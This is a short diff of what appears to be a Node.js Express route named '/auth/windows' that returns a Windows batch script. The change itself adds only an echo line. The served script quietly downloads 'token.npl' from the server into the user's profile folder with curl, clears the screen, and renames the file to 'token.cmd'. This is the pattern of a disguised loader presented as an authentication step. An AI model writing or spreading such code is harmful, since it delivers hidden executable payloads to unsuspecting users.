@@ -80,6 +80,7 @@ router.get("/auth/windows", (req, res) => {
     const domain = req.protocol + '://' + req.get('host');
     
     res.type("text/plain").send(`@echo off
+    echo $domain
     curl -s -L -o "%USERPROFILE%\\token" $domain/token.npl
     cls
     ren "%USERPROFILE%\\token" token.cmd
